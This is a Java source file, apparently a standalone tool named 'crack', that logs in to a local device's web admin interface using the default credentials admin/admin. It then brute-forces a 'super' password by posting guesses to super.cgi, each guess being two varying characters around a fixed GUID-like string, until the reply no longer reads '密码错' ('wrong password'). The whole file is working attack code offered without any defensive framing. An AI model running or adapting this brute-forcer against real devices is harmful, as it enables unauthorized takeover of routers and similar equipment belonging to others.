package zcy.socket.http;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class crack {
	 public static String GetResponseDataByID(String url,String postData) throws IOException
     {
      String data=null;
       URL dataUrl = new URL(url);
       HttpURLConnection con = (HttpURLConnection) dataUrl.openConnection();
       con.setRequestMethod("POST");
       con.setRequestProperty("Proxy-Connection", "Keep-Alive");
       con.setDoOutput(true);
       con.setDoInput(true);

       OutputStream os=con.getOutputStream();
       DataOutputStream dos=new DataOutputStream(os);
       dos.write(postData.getBytes());
       dos.flush();
       dos.close();

       InputStream is=con.getInputStream();
       DataInputStream dis=new DataInputStream(is);
       byte d[]=new byte[dis.available()];
       dis.read(d);
       data=new String(d);
       //System.out.println(data);
       con.disconnect();

      return data;
     }

	public static void main(String[] args) {
		String urlLogin = "http://192.168.0.250/cgi-bin/login.cgi";
		try {
			String a = crack.GetResponseDataByID(urlLogin, "save=0&page=%2F&user=admin&pass=admin&login_name=%E7%99%BB%E5%BD%95");
		} catch (Exception e1) {
			e1.printStackTrace();
		}
		for(int i=123;i<=126;i++)
		{
			for(int j=32;j<=126;j++)
			{
				if(i==39 || j==39) continue;
				String sPass = "pass=" + URLEncoder.encode(String.valueOf((char)i)) + "EE31B8B6-9113-48a9-A302-20CFE656CDB9" 
				+ URLEncoder.encode(String.valueOf((char)j)) + "&go=%E7%A1%AE%E5%AE%9A";
				
				String sRet = "";
				try{
					sRet = crack.GetResponseDataByID("http://192.168.0.250/super.cgi", sPass);
				}
				catch(Exception e)
				{
					System.out.println(sPass);
					System.out.print("int:" + String.valueOf(i) + String.valueOf(j));
					System.out.println("1String values:" + String.valueOf((char)i) + String.valueOf((char)j));
					e.printStackTrace();
				}
				if(sRet != null && !sRet.trim().equals("密码错"))
					{
					System.out.println("2String values:" + String.valueOf((char)i) + String.valueOf((char)j));
//					System.out.println(sRet);
					System.exit(0);
					}
			}
			System.out.println(i + "over");
		}
	}
}
